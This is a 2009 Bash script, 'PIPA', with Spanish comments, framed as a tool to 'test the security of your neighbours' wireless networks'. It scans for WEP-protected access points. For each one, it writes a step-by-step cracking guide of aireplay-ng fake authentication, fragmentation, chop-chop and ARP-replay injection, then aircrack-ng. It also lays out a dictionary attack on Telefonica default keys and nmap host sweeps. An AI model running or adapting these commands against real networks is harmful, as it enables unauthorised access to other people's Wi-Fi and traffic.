# !/bin/bash
# 
# PIPA, Peta Inalambricas Para Atheros, pretende algun dia ser un script para ayudar
# a testear la seguridad de las redes inalambricas de tus vecinos...
# 
# por moz667 <moz667@gmail.com>
# 
# Copyright (C) 2009 Jaime Delgado Horna [aka moz667]
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
# Actualizaciones en : http://code.google.com/p/ulbscripts/source/browse/trunk/moz667/pipa-2.sh
# 
# TODO: Fusionar con pipa.sh
# TODO: Spoof mac adress aleatorio en las funciones de modo station modo monitor
# 

function IfaceStaMode () {
	echo -n "Poniendo la interfaz en modo station "
	AUXDEV=`ifconfig | grep ath1`
	if [ "$AUXDEV" != "" ]
	then 
		airmon-ng stop ath1 > /dev/null
	fi
	echo -n "."
	AUXDEV=`ifconfig | grep ath0`
	if [ "$AUXDEV" != "" ]
	then
		AUXDEV=`iwconfig ath0 | grep Mode:Managed`
		if [ "$AUXDEV" == "" ]
		then
			airmon-ng stop ath0 > /dev/null
			echo -n "."
			wlanconfig ath create wlandev wifi0 wlanmode sta > /dev/null
			echo -n "."
			ifconfig ath0 up > /dev/null
			echo "."
		else
			echo "...."
		fi
	else
		echo -n "."
		wlanconfig ath create wlandev wifi0 wlanmode sta > /dev/null
		echo -n "."
		ifconfig ath0 up > /dev/null
		echo "."
	fi
}

function IfaceMonMode () {
	if [ "$1" == "" ]
	then
		CHANAUX=1
	else
		CHANAUX=$1
	fi
	echo -n "Poniendo la interfaz en modo monitor "
	AUXDEV=`iwconfig ath1 | grep Mode:Monitor`
	if [ "$AUXDEV" == "" ]
	then
		airmon-ng stop ath0 > /dev/null
		echo -n "."
		airmon-ng stop ath1 > /dev/null
		echo -n "."
		wlanconfig ath create wlandev wifi0 wlanmode sta > /dev/null
		echo -n "."
		ifconfig ath0 up > /dev/null
		echo -n "."
		airmon-ng start wifi0 $CHANAUX > /dev/null
		echo -n "."
		airmon-ng stop ath0 > /dev/null
		echo -n "."
		ifconfig ath1 down > /dev/null
		echo "."
		ifconfig ath1 up > /dev/null
	else
		IfaceChannelChange $CHANAUX
		echo "......."
	fi
}

function IfaceChannelChange () {
	# hay alguna veces (con aireplay lo he comprobado) que se queda pillado en un canal
	# y que no cambia con iwconfig channel a no ser que hagas down antes de la interfaz
	# TODO: Para los modo station no funciona... hace un auto cambiado de channel
	ifconfig $1 down
	iwconfig $1 channel $2
	ifconfig $1 up
}

function echb() {
	tput bold
	echo $*
	tput sgr0
}

if [ "$1" == "help" ]
then
	echo "PIPA, Peta Inalambricas Para Atheros, pretende algun dia ser un script "
	echo "para ayudar a testear la seguridad de las redes inalambricas de tus "
	echo "vecinos..."
	echo
	echb "Forma de uso"
	echo "  pipa-2.sh [comando]"
	echo
	echo "  PIPA ejecutandolo sin pasarle un commando te buscara putos de acceso "
	echo "  protegidos con WEP y generara directorios, a partir del sitio desde donde lo "
	echo "  ejcutas, con los nombres de los essid y direcciones mac de los distintos. "
	echo "  Ademas metera un archivo con una mini ayuda (ayud.txt) dentro de cada uno de "
	echo "  estos directorios"
	echo
	echb "Commandos"
	echo "  help           : Saca esta ayuda ;o)"
	echo "  gentoo-config  : Genera la configuracion para gentoo"
	echo "  debian-config  : Genera la configuracion para debian (debian, ubuntu y "
	echo "                   sucedaneos ...)"
	echo "  reset-iface    : Borra las interfaces ath1 y ath0 y crea una nueva en modo "
	echo "                   station (como volver a empezar)"
	echo "  iface-mon      : Borra las interfaces ath1 y ath0 y crea una nueva en modo "
	echo "                   monitor"
	echo "  capture [ch]   : Captura global filtrando wep en capture.cap en el dir que "
	echo "                   se ejecuta. Puedes especificarle un canal para filtrarlo mas "
	echo "  test-injection : Testea la inyeccion de paquetes en distintos canales y "
	echo "                   distintos aps que encuentre"
	echo "  search-ip      : Busca equipos arriba con nmap (para los puntos de acceso que "
	echo "                   no tengan dhcp, tarda un buen rato... no desesperes)"
	exit
fi

if [ "$1" == "gentoo-config" ]
then
	source variables.sh
	PASSWORD=`cat password.txt | grep KEY | sed -e "s/.*\[ //g" -e "s/ \].*//g"`
	echo "essid_ath0=\"$ESSID\""
	echo "key_$ESSID=\"$PASSWORD\""
	echo "config_ath0=( \"dhcp\" )"
	exit
fi

if [ "$1" == "mon-mode" ]
then
	IfaceMonMode $2
	AUXAIRO=""
	if [ $2 != "" ]
	then
		AUXAIRO="-c $2"
	fi
	airodump-ng --encrypt WEP $AUXAIRO -w capture ath1
	exit
fi	

if [ "$1" == "debian-config" ]
then
	source variables.sh
	# TODO : Hacer debian/ubuntu config
	
fi

if [ "$1" == "reset-iface" ]
then
	IfaceStaMode
	exit
fi

if [ "$1" == "iface-mon" ]
then
	IfaceMonMode
	exit
fi

if [ "$1" == "test-injection" ]
then
	IfaceMonMode
	
	CHANNEL_LIST=`iwlist ath1 channel | grep "Channel.*:" | sed -e "s/.*Channel //g" -e "s/ .*//g" -e "s/^0//g"`
	
	for CHANNEL_AUX in $CHANNEL_LIST
	do
		IfaceChannelChange ath1 $CHANNEL_AUX
		
		echo "PROBANDO CANAL : $CHANNEL_AUX"
		echo "===================================================================="
		aireplay-ng -9 ath1
	done
	exit
fi

# TODO : Comando probar config

if [ "$1" == "search-ip" ]
then
	# TODO: Hacer el nmap desde un bucle para poder hacer un prgreesbar o algo semejante.
	echo "## Probando con el rango 192.168.0.0 - 192.168.255.255, ignora el up 192.168.0.254"
	echo "## en cuantro encuentres una ip viva (up) puedes cancelar este proceso con Ctrl+C"
	echo "##"
	ifconfig ath0 192.168.0.254 netmask 255.255.0.0
	nmap -v -sP 192.168.0.0/16 |  grep " appears to be up"
	echo "## Probando con el rango 10.0.0.0 - 10.255.255.255, ignora el up 10.0.0.254"
	echo "## en cuantro encuentres una ip arriba (up) puedes cancelar este proceso con Ctrl+C"
	echo "##"
	ifconfig ath0 10.0.0.254 netmask 255.0.0.0
	nmap -v -sP 10.0.0.0/8 |  grep -v " appears to be up"
	exit
fi

if [ "$1" != "" ]
then
	echo "Comando no encontrado, prueba pipa help"
	exit
fi

IfaceStaMode

MAC_ADDRESS=`ifconfig wifi0 | grep HWaddr | sed -e "s/.*HWaddr //g" -e "s/ .*//g" -e "s/-00-00-00-00-00-00-00-00-00-00//g" -e "s/-/:/g"`

CHANNEL_LIST=`iwlist ath0 channel | grep "Channel.*:" | sed -e "s/.*Channel //g" -e "s/ .*//g" -e "s/^0//g"`

echo -n "Escaneando y guardando config :"

CHANNEL_AUX=1
for CHANNEL_AUX in $CHANNEL_LIST
do
	# TODO: no funciona en modo station, aun con esas dejamos el echo que queda mu cuul
	# IfaceChannelChange ath0 $CHANNEL_AUX
	# 
	echo; echo -n "[channel $CHANNEL_AUX] "
	
	IWLIST_DATA=`iwlist ath0 scan | grep "Address\|ESSID\|Channel\|WPA\|Mode\|Encryption" | tr "\n" " " | sed -e "s/Cell/\nCell/g" | grep "Mode:Master" | grep "Encryption key:on" | sed -e "s/Mode:Master//g" -e "s/Encryption key:on//g" | sed -e "s/Frequency:2.....GHz//p" | sort | uniq | sed -e "s/ESSID/ ESSID/g" | sed -e "s/Cell...//g" | grep -v WPA | sed -e "s/(/ /g" -e "s/)/ /g" -e "s/Channel/Channel:/g" | sed -e "s/^ - //g" -e "s/ *ESSID/ ESSID/g" -e "s/\" *Channel: /\" Channel:/g" -e "s/Address: /Address:/g"`
	IWLIST_DATA=`echo $IWLIST_DATA | sed -e "s/Address/\nAddress/g"`
	IWLIST_DATA=`echo $IWLIST_DATA | sed -e "s/ /#/g" | sed -e "s/Address/\nAddress/g"`

	for ESSID_CFG in $IWLIST_DATA
	do
		ESSID_CFG=`echo $ESSID_CFG | sed -e "s/#/ /g"`
		
		BSSID=`echo $ESSID_CFG | sed -e "s/Address://g" -e "s/ ESSID.*//g"`
		ESSID=`echo $ESSID_CFG | sed -e "s/.*ESSID:\"//g" -e "s/\".*//g"`
		CHANNEL=`echo $ESSID_CFG | sed -e "s/.*Channel://g" -e "s/ //g"`

		IWLIST_DATA_AUX="$IWLIST_DATA_AUX$CHANNEL#$BSSID#[$ESSID]\n"

		echo -n "."

		DIRWIFI=`echo "$ESSID-$BSSID" | sed -e "s/:/-/g" -e "s/ /\\ /g"`
		mkdir -p "$DIRWIFI"
	
		echo "BSSID=$BSSID" > "$DIRWIFI/variables.sh"
		echo "ESSID=$ESSID" >> "$DIRWIFI/variables.sh"
		echo "CHANNEL=$CHANNEL" >> "$DIRWIFI/variables.sh"
	
		echo "# 1) Inicializar la interfaz en modo monitor con :" > "$DIRWIFI/ayuda.txt"
		echo "airmon-ng start wifi0 $CHANNEL" >> "$DIRWIFI/ayuda.txt"
		echo "# 2) Destruimos la interfaz ath0 con :" >> "$DIRWIFI/ayuda.txt"
		echo "airmon-ng stop ath0" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
	
		echo "# 3) Probamos ha hacer una falsa autenticacion con :" >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -1 0 -e \"$ESSID\" -a $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 3.1) Si falla deberiamos mirar si el ap filtra por ap o si estamos lo suficientemente cerca. Si aun asi no conseguimos hacer la false autenticacion debemos desistir porque el resto de pasos fallara" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
		echo "# 4) En una nueva consola lanzamos la captura de paquetes con : " >> "$DIRWIFI/ayuda.txt"
		echo "airodump-ng -c $CHANNEL --bssid $BSSID -w capture ath1" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"

		echo "# 5) Aqui tenemos 2 caminos :" >> "$DIRWIFI/ayuda.txt"
		echo "# 5.1) Si hay clientes conectados podemos intentar el ataque por fragmentacion" >> "$DIRWIFI/ayuda.txt"
		echo "# 5.1.1) En otra nueva consola lanzamos el ataque por fragmentacion ejecutando :" >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -3 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 5.1.1.1) En cuanto empieze a inyectar paquetes pasamos al paso 5" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
	
		echo "# 5.2) Si NO hay clientes conectados podemos intentar el ataque chop-chop" >> "$DIRWIFI/ayuda.txt"
		echo "# 5.2.1) El ataque chop-chop requiere un paquete especial, lo capturamos lanzando :" >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -5 -b $BSSID -h $MAC_ADDRESS ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# 5.2.1.1) Si no recibimos paquetes o cuando los recibimos no los podemos inyectar deberemos buscar ayuda en aircrack-ng.org ;o) lo mas seguro sera que el ap este filtrando por mac o que tengamos que esperar a que haya un cliente generando paquetes de datos, ya lo se, pone que no es necesario que haya clientes conectados pero en algunos aps es probable que lo necesitemos" >> "$DIRWIFI/ayuda.txt"
		echo "# 5.2.2) Tenemos que generar un paquete arp especial que genera muchos IVS o algo asi, lo haremos lanzando :" >> "$DIRWIFI/ayuda.txt"
		echo "packetforge-ng -0 -a $BSSID -h $MAC_ADDRESS -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request" >> "$DIRWIFI/ayuda.txt"
		echo "# 5.2.3) En una nueva consola lanzamos la inyeccion del paquete formado con : " >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -2 -r arp-request ath1" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
		echo "# 6) En una nueva consola ejecutamos el crackeo de los paquetes capturados" >> "$DIRWIFI/ayuda.txt"
		echo "aircrack-ng -s -b $BSSID capture*.cap" >> "$DIRWIFI/ayuda.txt"
		echo "----------------------------------------------------" >> "$DIRWIFI/ayuda.txt"
		echo "# NOTAS :" >> "$DIRWIFI/ayuda.txt"
		echo "# N1) Para los casos de aps que no generan paquetes seria conveniente ejecutar en una nueva consola :" >> "$DIRWIFI/ayuda.txt"
		echo "watch -n 60 \"aireplay-ng -1 0 -e \\\"$ESSID\\\" -a $BSSID -h $MAC_ADDRESS ath1\"" >> "$DIRWIFI/ayuda.txt"
		echo "# N2) Para resetear la interfaz ejecutar y ponerla en modo normal :" >> "$DIRWIFI/ayuda.txt"
		echo "airmon-ng ath1 stop; wlanconfig ath0 create wlandev wifi0 wlanmode sta;" >> "$DIRWIFI/ayuda.txt"
		echo "# N3) Cambiar el canal de ath1, Hay veces (yo lo he visto al usar airmon-ng -9 ath1) que se queda en otro canal distinto al que configuramos inicialmente ath1 en el modo monitor, para cambiarlo ejecutar : " >> "$DIRWIFI/ayuda.txt"
		echo "ifconfig ath1 down; iwconfig ath1 channel $CHANNEL; ifconfig ath1 up;" >> "$DIRWIFI/ayuda.txt"
		echo "# N4) Siempre es conveniente saber a que aps podemos atacar y cuales estan mas cerca, la mejor forma es ejecutar : " >> "$DIRWIFI/ayuda.txt"
		echo "aireplay-ng -9 -a $BSSID ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# Si no nos diera un buen resultado podemos buscar otro ap cambiando primero el canal de la ath1 (ver punto N3), esto no es necesario, pero, facilita encontrar aps" >> "$DIRWIFI/ayuda.txt"
		echo "# N5) Otro modo para petar algunas wifis especiales configuradas por defecto" >> "$DIRWIFI/ayuda.txt"
		echo "# por telefonica (las WLAN_XX) con wlandecrypter, hace un ataque con diccionario que de tener" >> "$DIRWIFI/ayuda.txt"
		echo "# el ap configurado por defecto tarda un par de segundos en petarlo" >> "$DIRWIFI/ayuda.txt"
		echo "# Para que funcione necesitamos capturar algun paquete de datos" >> "$DIRWIFI/ayuda.txt"
		echo "# capturamos : " >> "$DIRWIFI/ayuda.txt"
		echo "airodump-ng -c $CHANNEL --bssid $BSSID -w capture ath1" >> "$DIRWIFI/ayuda.txt"
		echo "# una vez que tengamos datos ejecutamos : " >> "$DIRWIFI/ayuda.txt"
		echo "wlandecrypter $BSSID $ESSID | wepattack -f *.cap" >> "$DIRWIFI/ayuda.txt"
		echo "# de tener el ap configurado por timofonica tendras la clave en un segundo" >> "$DIRWIFI/ayuda.txt"

		echo "# N998) Para probrar la config a pelo :" >> "$DIRWIFI/ayuda.txt"
		echo "pipa reset-iface" >> "$DIRWIFI/ayuda.txt"
		echo "iwconfig ath0 essid \"$ESSID\" key s:[CLAVE]" >> "$DIRWIFI/ayuda.txt"
		echo "# N999) Para una version abreviada de este documento sin los comentarios ejecutar :" >> "$DIRWIFI/ayuda.txt"
		echo "grep -v \"#\" ayuda.txt" >> "$DIRWIFI/ayuda.txt"
	done
done
echo

echo "Quieres testear uno a uno los distintos puntos de acceso encontrados? (S/n) :"
read res

if [ "$res" == "n" ]
then
	exit 0
fi

IfaceMonMode

# El for in separa por espacio o retorno de carro, por ello quitamos los espacios en blanco
# sustituyendolos por #
IWLIST_DATA_AUX=`echo $IWLIST_DATA_AUX | tr " " "#" | sort | uniq`

for ESSID_CFG in `echo -e $IWLIST_DATA_AUX`
do
	BSSID=`echo $ESSID_CFG | sed -e "s/#/ /g" -e "s/ \[.*//g" -e "s/.* //g"`
 	ESSID=`echo $ESSID_CFG | sed -e "s/#/ /g" -e "s/.*\[//g" -e "s/\].*//g"`
 	CHANNEL=`echo $ESSID_CFG | sed -e "s/#/ /g" -e "s/ .*//g"`

	echo "==============================================================================="
	echo " * Probando :: $BSSID [$ESSID]"
	echo "==============================================================================="
	echo "   Pulsa Ctrl+C para salir"
	
	IfaceChannelChange ath1 $CHANNEL
	
	echo; echo "Probando asociacion : "
	aireplay-ng -1 0 -e "$ESSID" -a $BSSID -h $MAC_ADDRESS ath1
	
	echo; echo "Probando inyeccion : "
	aireplay-ng -9 -a $BSSID ath1
done

IfaceStaMode

echo "Terminado!!!"
